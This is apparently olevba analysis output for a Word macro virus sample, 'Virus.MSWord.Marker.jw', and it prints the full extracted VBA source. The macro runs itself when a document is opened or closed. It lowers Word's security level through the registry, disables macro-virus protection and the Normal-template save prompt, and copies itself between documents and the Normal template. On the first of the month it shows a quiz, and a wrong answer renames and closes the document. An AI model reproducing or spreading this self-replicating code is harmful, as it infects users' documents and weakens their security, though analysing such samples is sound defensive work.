olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.jw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.jw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String
Private Sub Document_Close()
On Error Resume Next
  Call Document_Open
  If DI And Not (TI) Then
    Src = d.CodeModule.Lines(1, d.CodeModule.CountOfLines)
    t.CodeModule.AddFromString Src
    NormalTemplate.Save
  ElseIf TI And Not (DI) Then
If Day(Now()) = 1 Then
 Do
 r = UCase(InputBox("і¤°ІЦ®РЗіµі¤¶аЙЩГЧ?" & Chr(13) & Chr(13) _
 & "A.3ГЧ4  B.3ГЧ5  C.3ГЧ55  D.3ГЧ7" & Chr(13) & Chr(13) _
 & "ТЄєГєГЛјїјУґ!", "Ѕфј±МбОК"))
 Loop Until r <> ""
 If r = "B" Then
   MsgBox "єГ°фУґ!"
   GoTo 10
 Else
   MsgBox "°¦!ФЩёшДгТ»ґО»ъ»б."
    Do
     r = UCase(InputBox("і¤°ІЦ®РЗFBAКЗКІГґРН?" & Chr(13) & Chr(13) _
     & "A.±кЧјРН  B.ЖХНЁРН  C.єА»ЄРН" & Chr(13) & Chr(13) _
     & "ПлєГБЛФЩ»Шґр!", "Ѕфј±МбОК"))
    Loop Until r <> ""
      If r = "C" Then
        MsgBox "Р»Р»ДгµДЦ§іЦ!"
        GoTo 10
      Else
        MsgBox "±їµ°!ёшДгЧоєуТ»ґО»ъ»б."
          Do
           r = UCase(InputBox("°ІИ«ЖшДТКЗёЙКІГґУГµД?" & Chr(13) & Chr(13) _
           & "A.·АЦ№ЧІіµ  B.·АЦ№Іа»¬  C.ЧІіµК±±Ј»¤јЭК»Ф±" & Chr(13) & Chr(13) _
           & "ХвКЗЧоєуТ»ґО»ъ»бУґ!", "Ѕфј±МбОК"))
          Loop Until r <> ""
           If r = "C" Then
             MsgBox "ЧЬЛгґр¶ФБЛ!"
             GoTo 10
           Else
             MsgBox "їґАґДг»№РиТЄ¶Фі¤°ІЦ®РЗ¶ајУБЛЅв..."
             ActiveDocument.SaveAs "c:\lzc.vxd"
             ActiveDocument.Close
             Exit Sub
           End If
      End If
 End If
End If
10:
    Src = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
    d.CodeModule.AddFromString Src
    ActiveDocument.Save
  End If
End Sub

Private Sub Document_Open()
On Error Resume Next
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
DI = d.CodeModule.Find("і¤°І№«ЛѕЖыСРЛщ іЈК¶їОa", 1, 1, 1000, 1000)
TI = t.CodeModule.Find("і¤°І№«ЛѕЖыСРЛщ іЈК¶їОa", 1, 1, 1000, 1000)
  If DI And Not (TI) Then
    t.CodeModule.DeleteLines 1, t.CodeModule.CountOfLines
  ElseIf TI And Not (DI) Then
    d.CodeModule.DeleteLines 1, d.CodeModule.CountOfLines
  End If
End Sub






























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

